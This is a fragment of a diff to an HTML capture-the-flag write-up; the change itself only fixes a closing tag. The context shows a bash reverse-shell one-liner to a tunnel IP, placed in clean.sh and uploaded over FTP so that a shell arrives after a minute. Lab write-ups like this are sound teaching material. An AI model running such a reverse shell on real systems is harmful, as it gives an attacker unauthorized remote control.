@@ -62,7 +62,7 @@ we put
 <pre><code>
 #!/bin/bash
 sh -i >& /dev/tcp/<tunnel ip>/10101 0>&1
-<pre><code>
+</pre></code>
 in the <code>clean.sh</code> on our machine and upload it to the server using <code>put clean.sh</code> on the ftp server while listening to the port specified.
 After one minute we get the shell.
 <br><br><img src="assets/shell.png"><br><br>
